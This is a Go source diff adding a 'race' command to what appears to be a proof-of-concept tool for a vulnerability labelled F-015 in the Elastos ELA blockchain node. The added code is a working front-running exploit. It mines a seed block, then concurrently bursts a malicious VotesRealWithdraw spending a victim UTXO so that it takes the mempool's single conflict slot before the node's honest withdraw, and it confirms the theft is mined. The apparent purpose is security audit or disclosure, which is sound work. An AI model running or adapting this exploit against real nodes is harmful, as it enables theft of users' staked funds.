@@ -40,6 +40,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"sync"
 	"time"
 
 	"github.com/elastos/Elastos.ELA/account"
@@ -551,6 +552,76 @@ func cmdBuildReturnVotes(args []string) {
 	fmt.Printf("RETURNVOTES_HEX=%s\n", serializeHex(signed))
 }
 
+// cmdRace demonstrates the F-015 front-run. The node auto-generates an HONEST
+// VotesRealWithdraw (spending stake-pool UTXOs) for every pending seed and appends
+// it to the mempool via an async goroutine; the mempool allows only ONE
+// VotesRealWithdraw at a time (constant conflict slot). To land the MALICIOUS
+// withdraw (spending a victim UTXO) the attacker must grab that slot first.
+//
+// This single process, over one keep-alive connection, submits the seed ReturnVotes,
+// mines one block (committing the seed), then IMMEDIATELY bursts the pre-built
+// malicious withdraw -- racing (and beating) the node's honest goroutine, whose
+// path includes an isCurrent() channel round-trip plus a UTXO scan.
+//
+//   race <returnvotes-hex> <withdraw-hex> [burst]
+func cmdRace(args []string) {
+	check(len(args) >= 2, "usage: race <returnvotes-hex> <withdraw-hex> [burst]")
+	rvHex, wHex := args[0], args[1]
+	burst := 40
+	if len(args) >= 3 {
+		if n, err := strconv.Atoi(args[2]); err == nil && n > 0 {
+			burst = n
+		}
+	}
+	rpc := newRPC()
+	// 1) seed the withdrawable and commit it in a block.
+	rvTxid, err := rpc.submit(rvHex)
+	fatal("submit returnvotes", err)
+	fmt.Printf("seed_returnvotes_txid=%s\n", rvTxid)
+	// Mine the seed block with a RAW discretemining call (NO trailing getblockcount)
+	// so the malicious burst fires with minimum latency after the block commits --
+	// the node's honest goroutine still has to do an isCurrent() channel round-trip
+	// and a stake-pool UTXO scan before it can append.
+	_, err = rpc.call("discretemining", map[string]interface{}{"count": 1})
+	fatal("discretemining", err)
+	// 2) burst the malicious withdraw CONCURRENTLY to grab the conflict slot first.
+	var wonTxid string
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+	for i := 0; i < burst; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			txid, err := rpc.submit(wHex)
+			if err == nil {
+				mu.Lock()
+				wonTxid = txid
+				mu.Unlock()
+			}
+		}()
+	}
+	wg.Wait()
+	if wonTxid == "" {
+		fmt.Println("MALICIOUS_LOST slot held by honest auto-withdraw")
+		return
+	}
+	fmt.Printf("MALICIOUS_ACCEPTED txid=%s\n", wonTxid)
+	// 3) mine it in; the honest goroutine is now locked out of the slot.
+	rpc.discreteMine(1)
+	// 4) confirm the malicious tx is in a block.
+	res, err := rpc.call("getrawtransaction", map[string]interface{}{"txid": wonTxid})
+	if err != nil {
+		fmt.Printf("confirm_error=%v\n", err)
+		return
+	}
+	var r struct {
+		Confirmations int    `json:"confirmations"`
+		BlockHeight   uint32 `json:"blockheight"`
+	}
+	_ = json.Unmarshal(res, &r)
+	fmt.Printf("MALICIOUS_MINED blockheight=%d confirmations=%d\n", r.BlockHeight, r.Confirmations)
+}
+
 // cmdBuildWithdraw constructs the F-015 VotesRealWithdraw and prints its hex.
 // It SIGNS NOTHING: this tx type is exempt from RunPrograms, so its only
 // authorization is input provenance -- exactly the property F-015 restores by
@@ -676,6 +747,8 @@ func main() {
 		cmdBuildReturnVotes(args)
 	case "buildwithdraw":
 		cmdBuildWithdraw(args)
+	case "race":
+		cmdRace(args)
 	default:
 		fmt.Fprintf(os.Stderr, "unknown subcommand %q\n", os.Args[1])
 		usage()
